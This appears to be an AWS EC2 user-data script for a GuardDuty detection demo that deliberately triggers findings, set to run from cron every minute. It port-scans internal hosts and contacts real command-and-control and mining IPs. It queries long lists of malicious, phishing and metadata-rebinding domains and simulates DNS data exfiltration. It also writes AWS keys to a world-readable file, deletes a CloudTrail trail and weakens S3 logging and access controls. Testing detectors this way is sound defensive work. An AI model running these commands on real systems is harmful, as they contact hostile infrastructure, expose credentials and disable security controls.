sudo su
cat <<'EOF' >> /home/ec2-user/guardduty-script-credentials.sh

export PATH=$PATH:/usr/local/bin
tmp_dir=/home/ec2-user
region=us-east-1
sudo yum update -y

# Get parameters from SSM Parameter Store
id=$(aws sts get-caller-identity --query Account | tr -d '"')
dynamodb_name=$(aws ssm get-parameter --name security_demo_dynamodb_name --region $region --output text --query Parameter.Value)
access_key=$(aws ssm get-parameter --name security_demo_access_key --region $region --output text --query Parameter.Value)
secret_key=$(aws secretsmanager get-secret-value --secret-id guardduty-demo-user-secret-key --region $region --output text --query SecretString)
bucket_name=$(aws ssm get-parameter --name security_demo_s3_user_data_bucket_parameter --region $region --output text --query Parameter.Value)

#Block public S3 access at the account level
aws s3control put-public-access-block --account-id $id --public-access-block-configuration "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true" --region $region

# Set Parameters in SSM
aws ssm put-parameter --name 'gd_prod_dbpwd_sample' --type "SecureString" --value 'Password123' --overwrite --region $region

# Add Item to Customer DB
aws dynamodb put-item --table-name $dynamodb_name --item '{ "name": { "S": "Joshua Tree" }, "state": {"S": "California"}, "website":{"S": "https://www.nps.gov/jotr/index.htm"} }' --region $region

# Install Tor and NMAP
sudo yum -y install https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
sudo yum install tor -y
sudo service tor start

sudo yum install nmap -y

# Create S3 and IAM GuardDuty findings
cloudtrail_name=guardduty-demo-trail-$RANDOM
aws cloudtrail create-trail --name $cloudtrail_name --s3-bucket-name $bucket_name --is-multi-region-trail --region $region
aws cloudtrail delete-trail --name $cloudtrail_name --region $region
aws iam delete-account-password-policy
aws iam update-account-password-policy --minimum-password-length 6 --require-uppercase-characters --require-lowercase-characters --require-numbers --require-symbols --max-password-age 90 --password-reuse-prevention 5

# Create EC2 GuardDuty findings

# Recon:EC2/Portscan 
sudo nmap -Pn -sT 172.31.37.171
sudo nmap -sT $ec2_private_ip

# Backdoor:EC2/C&CActivity.B
curl http://167.71.13.196:2222/
curl http://92.242.40.21:1534/
curl -L https://raw.githubusercontent.com/awslabs/amazon-guardduty-tester/master/artifacts/queries.txt > $tmp_dir/queries.txt
curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &
curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &
dig -f $tmp_dir/queries.txt > /dev/null &
dig GuardDutyC2ActivityB.com any

# CryptoCurrency:EC2/BitcoinTool.B
curl http://51.81.186.228:17777/
curl http://51.81.186.228:17777/

# Trojan:EC2/BlackholeTraffic
curl http://199.2.137.22/

# Trojan:EC2/DropPoint
curl http://208.91.198.143:587/
curl http://208.91.198.143:587/
curl http://148.163.89.221:587/
curl http://148.163.89.221:587/

# Impact:EC2/AbusedDomainRequest.Reputation
dig f0573107.xsph.ru
dig f0573107.xsph.ru

# Impact:EC2/BitcoinDomainRequest.Reputation
dig dgb-odocrypt.f2pool.com
dig europe.cryptonight-hub.miningpoolhub.com

#  Impact:EC2/MaliciousDomainRequest.Reputation
dig  itunesmusic.zzux.com
dig abc.wikaba.com

# Impact:EC2/SuspiciousDomainRequest.Reputation
dig foods.x24hr.com
dig onlinednsserver.sendsmtp.com

# CryptoCurrency:EC2/BitcoinTool.B!DNS
dig donate.v2.xmrig.com
dig systemten.org
dig xmr.pool.minergate.com
dig pool.minergate.com
dig dockerupdate.anondns.net
dig rspca-northamptonshire.org.uk
dig xmrpool.eu
dig cryptofollow.com
dig xmr-usa.dwarfpool.com
dig xmr-eu.dwarfpool.com
dig xmr-eu1.nanopool.org

# Trojan:EC2/BlackholeTraffic!DNS
dig i.yldbt.com
dig jflynci.com
dig gami1.com
dig playncs.com
dig cdn.yldbt.com
dig zonetf.com
dig semmi.no-ip.org
dig csp-reporting-service.com
dig quiboxs.com
dig okonewacon.com
dig khaledtuedu.serveblog.net
dig inteldrv64.com
dig go-quicky.com
dig fullset.info
dig agv-us.com
dig actblues.com
dig zeus47.no-ip.org
dig ya-support.com
dig windowsupdote.net
dig we11point.com
dig vip.ere5453.com

# Trojan:EC2/DGADomainRequest.B
dig grpkztjrgthdtbgcx.com
dig asdfghjklwertyuiozxcvbnm.com
dig jimflynnohoto.com
dig titsgniaigds.com
dig alsodoesnotexistweuvnxsjdhjeuhwe2847sa3.net
dig purebyamimckay.co
dig automnxpyqwmtnuiydbo.com
dig automnwufkmncducbghg.com
dig automndnmvtxtsjxxfrq.com
dig wusudumbuyajr.com
dig stjoelawfirm.com
dig okbcwiesehan.net
dig mtuaburnobgyn.com
dig isaacmfokeng.com
dig brrakthrubev.com
dig 05wcanaeggz30g3a48lp.com
dig wallkillvrhs.com
dig tonysouzasrq.com
dig paigekrzysko.com
dig kljskldfjklsd.com
dig zivotzafutbal.info
dig vogelzamglaw.com
dig ukvozrozdenie.com
dig testmjhdtfsdbchjnvfv.com
dig tbxmakazxsoyltu.cf
dig sgbarrdevlin.com
dig runolfsdottir.info
dig muhsdstudwnts.org
dig mlbsummitrsvp.com
dig mehmetkivrim.com
dig mcsytemshvac.com
dig mccmadvogados.com.br
dig markbohdanyk.com
dig maaggiemcflys.com
dig lolkogpovlsen.dk
dig iubdritjlknpgtw9jsmd.com

# Trojan:EC2/DriveBySourceTraffic!DNS
dig spcang.com
dig coin-hive.com
dig lhxlihz.com
dig ctq41z.com
dig temizlikhizmetleri.net
dig share.dmca.gripe
dig rflf84.com

# Trojan:EC2/DropPoint
dig altusace.com
dig akitus.com
dig ajkerbaazaar.com
dig danlaid.com.au
dig johnsglen.xyz
dig sucurusalvirtualpersonasbancolombia.com
dig instaketo.com
dig computerooter.com
dig melonoptics.com
dig laisundining.com
dig bossmogul.com
dig agnacional.com.br
dig abieffeimpresa.it
dig u842504ngz.ha004.t.justns.ru
dig rakuten.co.jp.rakuteni.top
dig maleexcellhealth.com
dig login.rakuten.co.jp.rakutenlkfefcbfsswbdxcd.xyz
dig login.rakuten.co.jp.rakutenlkfefcbfsswbdxcd.buzz


# UnauthorizedAccess:EC2/MetadataDNSRebind
dig ec2-metadata.salefreaks.com
dig metadata.trusteer.net
dig metadata.moat.com
dig ec2.maxmilhas.com.br
dig ssrf-test.thinktilt.com
dig 169.254.169.254.xip.io
dig security-test.alpha.$region.execute-api.com
dig mysite.169.254.169.254.xip.io
dig vulnerable.postman.wtf
dig 1ynrnhl.xip.io
dig aws.jeni.sh
dig maisonmargiela-perfumes.com
dig meta.dns.praetorianlabs.com
dig imds.karanlyons.com
dig www.owasp.org.1ynrnhl.xip.io
dig a9fea9fe.22c145fc.rbndr.us
dig aws.r87.me
dig a9fea9fe.01010101.rbndr.us
dig mws.rce.ee
dig a9fea9fe.a9fea9fb.rbndr.us
dig 1.haxi0r.xyz
dig ssrf.xxe.ninja
dig 169.254.169.254.nip.io
dig s-68.183.247.249-169.254.169.254-1244484515-rr-e.d.rebind.it
dig s-68.183.247.249-169.254.169.254-1203466983-fs-e.d.rebind.it
dig s-68.183.247.249-169.254.169.254-587270983-fs-e.d.rebind.it
dig s-68.183.247.249-169.254.169.254-3609101812-fs-e.d.rebind.it

# Trojan:EC2/PhishingDomainRequest!DNS
dig xpertdomain.com
dig alaskagyrfalcons.com
dig consultoriaspublicas.cl
dig mailserver89.com
dig absolutezeroextracts.com
dig www.absolutezeroextracts.com
dig jga9spzas.appspot.com
dig youridentityactivity.world
dig www.pescapantry.com
dig trixy-groves.com
dig top.nov.ru
dig secoresoei.github.io
dig raindroptoiletries.com
dig qov.sa.com
dig pescapantry.com
dig us.battle.net.login.login.xml.account.support.management-legion.xyz

# Trojan:EC2/DNSDataExfiltration
for i in {1..10}
do
  dig CgpMb3JlbSBpcHN1bSBkb2xvciBzaXQgYW1ldC.afsdem.com
  dig wgY29uc2VjdGV0dXIgYWRpcGlzY2luZyBlbGl0.afsdem.com
  dig LiBWZXN0aWJ1bHVtIGFjIHJpc3VzIGRvbG9yLi.afsdem.com
  dig BJbiBldSBpbXBlcmRpZXQgbWksIGlkIHNjZWxl.afsdem.com
  dig cmlzcXVlIG9yY2kuIE51bGxhbSB1dCBsaWJlcm.afsdem.com
  dig 8gcHVydXMuIFBlbGxlbnRlc3F1ZSBhdCBmcmlu.afsdem.com
  dig Z2lsbGEgbWV0dXMsIGFjIHVsdHJpY2VzIGVyYX.afsdem.com
  dig QuIEZ1c2NlIGN1cnN1cyBtb2xsaXMgcmlzdXMg.afsdem.com
  dig dXQgdWx0cmljaWVzLiBOYW0gbWFzc2EganVzdG.afsdem.com
  dig 8sIHVsdHJpY2llcyBhdWN0b3IgbWkgdXQsIGRp.afsdem.com
  dig Y3R1bSBsb2JvcnRpcyBudWxsYS4gTnVsbGEgc2.afsdem.com
  dig l0IGFtZXQgZmVsaXMgbm9uIGlwc3VtIHZlc3Rp.afsdem.com
  dig YnVsdW0gcmhvbmN1cy4gTG9yZW0gaXBzdW0gZG.afsdem.com
  dig 9sb3Igc2l0IGFtZXQsIGNvbnNlY3RldHVyIGFk.afsdem.com
  dig aXBpc2NpbmcgZWxpdC4gSW4gZmF1Y2lidXMgaW.afsdem.com
  dig QgZWxpdCBhdCBtYXhpbXVzLiBBbGlxdWFtIGRh.afsdem.com
  dig cGlidXMgdXQgbWF1cmlzIG5lYyBmYXVjaWJ1cy.afsdem.com
  dig 4gUHJvaW4gYXVjdG9yIGxpYmVybyBuZWMgYXVn.afsdem.com
  dig dWUgc2FnaXR0aXMgY29uZGltZW50dW0uIFZlc3.afsdem.com
  dig RpYnVsdW0gYmliZW5kdW0gb2RpbyBxdWFtLCBh.afsdem.com
  dig dCBjb25ndWUgbnVsbGEgdml2ZXJyYSBpbi4gSW.afsdem.com
  dig 4gdWx0cmljaWVzIHR1cnBpcyBhdCBmYWNpbGlz.afsdem.com
  dig aXMgZGljdHVtLiBFdGlhbSBuaXNpIGFudGUsIG.afsdem.com
  dig RpY3R1bSBldCBoZW5kcmVyaXQgbmVjLCBzb2Rh.afsdem.com
  dig bGVzIGlkIGVyb3MuCgpQaGFzZWxsdXMgZmV1Z2.afsdem.com
  dig lhdCBudW5jIHNlZCBzdXNjaXBpdCBmYXVjaWJ1.afsdem.com
  dig cy4gQWVuZWFuIHRpbmNpZHVudCBwb3J0dGl0b3.afsdem.com
  dig IgbmlzbCwgdXQgY3Vyc3VzIGZlbGlzIHZvbHV0.afsdem.com
  dig cGF0IHZpdGFlLiBNb3JiaSBuZWMgbGVvIHB1bH.afsdem.com
  dig ZpbmFyLCBhY2N1bXNhbiBtYXVyaXMgbmVjLCBj.afsdem.com
  dig b21tb2RvIG1hdXJpcy4gTmFtIGNvbW1vZG8gZW.afsdem.com
  dig dldCBlbmltIGF0IGFsaXF1YW0uIFN1c3BlbmRp.afsdem.com
  dig c3NlIGVnZXN0YXMgbWFzc2EgaWQgcmlzdXMgcG.afsdem.com
  dig VsbGVudGVzcXVlIHBvcnR0aXRvciBuZWMgbmVj.afsdem.com
  dig IG5lcXVlLiBDcmFzIG5lYyBzZW0gYXJjdS4gTn.afsdem.com
  dig VsbGEgcXVpcyBzYXBpZW4gaW4gbGFjdXMgbGFj.afsdem.com
  dig aW5pYSB1bHRyaWNlcyBtYXR0aXMgZXQgcHVydX.afsdem.com
  dig MuIE51bmMgZmVybWVudHVtIG5lcXVlIGlkIG51.afsdem.com
  dig bmMgYmxhbmRpdCBtYXhpbXVzLiBEdWlzIGV1IH.afsdem.com
  dig NvbGxpY2l0dWRpbiBudWxsYSwgYWMgbWF0dGlz.afsdem.com
  dig IGF1Z3VlLiBNYXVyaXMgcXVpcyBjdXJzdXMgaX.afsdem.com
  dig BzdW0sIHF1aXMgZnJpbmdpbGxhIHNlbS4gTW9y.afsdem.com
  dig YmkgbWFsZXN1YWRhIHNhcGllbiBzZWQgbWV0dX.afsdem.com
  dig MgY29udmFsbGlzLCBzaXQgYW1ldCBldWlzbW9k.afsdem.com
  dig IGF1Z3VlIHBlbGxlbnRlc3F1ZS4gTW9yYmkgbm.afsdem.com
  dig liaCBlcmF0LCBwb3N1ZXJlIHNpdCBhbWV0IGFj.afsdem.com
  dig Y3Vtc2FuIG5lYywgbWFsZXN1YWRhIGEgbGVvLg.afsdem.com
  dig oKRG9uZWMgZXUgcHJldGl1bSBvZGlvLiBBZW5l.afsdem.com
  dig YW4gdHJpc3RpcXVlIHF1YW0gdmVsIG9yY2kgYW.afsdem.com
  dig xpcXVhbSwgbmVjIHNjZWxlcmlzcXVlIG51bmMg.afsdem.com
  dig c3VzY2lwaXQuIEV0aWFtIGVsaXQgc2VtLCB2aX.afsdem.com
  dig ZlcnJhIG5lYyBmcmluZ2lsbGEgdml0YWUsIGV1.afsdem.com
  dig aXNtb2QgaWQgdHVycGlzLiBJbnRlZ2VyIHF1aX.afsdem.com
  dig MgZXJhdCBlZ2V0IGFyY3UgdGluY2lkdW50IHBl.afsdem.com
  dig bGxlbnRlc3F1ZS4gQ3VyYWJpdHVyIHF1YW0gbn.afsdem.com
  dig VsbGEsIGx1Y3R1cyB2ZWwgdm9sdXRwYXQgZWdl.afsdem.com
  dig dCwgZGFwaWJ1cyBldCBudW5jLiBOdW5jIHF1aX.afsdem.com
  dig MgbGliZXJvIGFsaXF1YW0sIGNvbmRpbWVudHVt.afsdem.com
  dig IGp1c3RvIHF1aXMsIGxhY2luaWEgbmVxdWUuIF.afsdem.com
  dig Byb2luIGRhcGlidXMgZWxpdCBhdCBoZW5kcmVy.afsdem.com
  dig aXQgbWF4aW11cy4gU2VkIHNlbXBlciBudW5jIG.afsdem.com
  dig 1hc3NhLCBlZ2V0IHBlbGxlbnRlc3F1ZSBlbGl0.afsdem.com
  dig IHNhZ2l0dGlzIHNlZC4g.afsdem.com
done

# Create Creds and Config files
if [ ! -d $tmp_dir/.aws ];
then
    echo "$tmp_dir/.aws already exists." 
else
    sudo mkdir $tmp_dir/.aws
fi
touch $tmp_dir/.aws/credentials
touch $tmp_dir/.aws/config

cat <<EOT >> $tmp_dir/.aws/credentials
[default]
aws_access_key_id = $access_key
aws_secret_access_key = $secret_key
EOT

# Modify Permissions and Ownership
chmod 746 $tmp_dir/.aws/credentials
chown ec2-user $tmp_dir/.aws/credentials
chmod 746 $tmp_dir/.aws/config
chown ec2-user $tmp_dir/.aws/config

sleep 1m

cat <<EOT >> $tmp_dir/gd-findings.sh
aws s3api list-buckets
aws s3api delete-public-access-block --bucket $bucket_name --region $region
aws s3api put-bucket-logging --bucket $bucket_name --bucket-logging-status {} --region $region
EOT

sudo chmod 744 $tmp_dir/gd-findings.sh
chown ec2-user $tmp_dir/gd-findings.sh
sudo $tmp_dir/gd-findings.sh

EOF
sudo chmod 744 /home/ec2-user/guardduty-script-credentials.sh
chown ec2-user /home/ec2-user/guardduty-script-credentials.sh
echo "* * * * * /home/ec2-user/guardduty-script-credentials.sh > /home/ec2-user/guardduty-script-credentials.log 2>&1" | tee -a /var/spool/cron/ec2-user
sudo /home/ec2-user/guardduty-script-credentials.sh